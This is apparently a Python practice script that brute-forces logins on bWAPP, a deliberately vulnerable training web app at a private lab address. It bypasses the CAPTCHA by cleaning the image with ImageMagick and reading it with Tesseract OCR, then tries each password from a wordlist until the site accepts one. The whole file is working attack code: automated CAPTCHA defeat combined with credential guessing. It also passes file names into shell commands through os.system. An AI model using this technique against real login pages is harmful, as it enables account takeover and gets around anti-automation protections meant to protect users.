#!/usr/bin/python3
#coding: utf-8

import requests, re, time, os, signal
import pytesseract
from PIL import Image
from pwn import *

test = input("Test Color s/n: ").strip()
if test == "n":
	user = input("Ingrese Usuario -> ").strip()
	word = input("Pass Wordlists  -> ").strip()
	status_color = input("Cambio color s/n -> ").strip()

url_get_captcha = "http://192.168.18.60/bWAPP/bWAPP/captcha.php"
url_valida_captcha = "http://192.168.18.60/bWAPP/bWAPP/ba_captcha_bypass.php"

def handler(sig, frame):
	log.info("Saliendo...")
	os.remove("captcha.jpg")
	os.remove("captcha.jpg.tif")
	sys.exit(0)

signal.signal(signal.SIGINT, handler)

def testingColor():
	s = requests.session()
	header_session = {
	'Cookie': 'security_level=2; PHPSESSID=fbf2852f4b54d980a2671b676621d6da'
	}
	r1 = s.get(url_get_captcha, headers=header_session)
	f = open('captcha.jpg','wb')
	f.write(r1.content)
	f.close()

	for i in range(100): # testing
		os.system("convert captcha.jpg -fill white -fuzz 10% +opaque '#dd4c0d' captcha{}.tif".format(i)) #color a buscar
		os.system("convert captcha{}.tif -morphology Erode Disk:1.5 captcha{}.tif".format(i,i))
		os.system("convert captcha{}.tif -level 70%,{}% captcha{}.tif".format(i,i,i)) #setear color
		valor = pytesseract.image_to_string(Image.open('captcha{}.tif'.format(i)))
		print(valor.replace(" ", ""))

def cambioColor(captcha):
	os.system("convert {captcha} -fill white -fuzz 10% +opaque '#dd4c0d' {captcha}.tif".format(captcha=captcha)) #color a buscar
	os.system("convert {captcha}.tif -morphology Erode Disk:1.5 {captcha}.tif".format(captcha=captcha))
	os.system("convert {captcha}.tif -level 70%,100% {captcha}.tif".format(captcha=captcha)) #setear color
	return pytesseract.image_to_string(Image.open('{captcha}.tif'.format(captcha=captcha)))

def getImage(password):

	status = 0
	while status == 0:
		try:
			s = requests.session()
			header_session = {
			'Cookie': 'security_level=2; PHPSESSID=7a97f6a436fca6d2f592a19ce3d8039a'
			}

			r1 = s.get(url_get_captcha, headers=header_session)
			f = open('captcha.jpg','wb')
			f.write(r1.content)
			f.close()

			print("-----------------------------------------")

			p1 = log.progress("Captcha")
			p1.status("Obteniendo valor de captcha")

			if status_color == 's':
				p1.status("Modificando color de imagen")
				captcha_value = cambioColor('captcha.jpg')
			else:
				captcha_value = pytesseract.image_to_string(Image.open('captcha.jpg'))

			p1.status("User/Password - Captcha: {}/{} - {}".format(user, password, str(captcha_value)))

			p2 = log.progress("Send captcha")
			p2.status("Enviando captcha")

			#Envio de captcha y credenciales post
			post_data = {
			'login': '%s' % user,
			'password': '%s' % password,
			'captcha_user': '%s' % captcha_value,
			'form': 'submit'
			}

			r2 = s.post(url_valida_captcha, data=post_data, headers=header_session)

			if "Incorrect CAPTCHA!" not in r2.text and captcha_value.strip():
				p2.status("Captcha introducido correctamente")

				if "Invalid credentials! Did you forgot your password?" not in r2.text:
					p2.success("Credenciales encontradas ({} - {})".format(user, password))
					os.remove("captcha.jpg")
					os.remove("captcha.jpg.tif")
					sys.exit(0)
				status = 1
			else:
				p2.failure("Error al introducir captcha")

		except Exception as e:
			log.failure("Ha ocurrido un error: {}".format(str(e)))
			sys.exit(1)

if __name__ == '__main__':

	if test == "n":
		with open(word) as f:
			lines = [line.rstrip() for line in f]

		for password in lines:
			getImage(password)
	else:
		testingColor()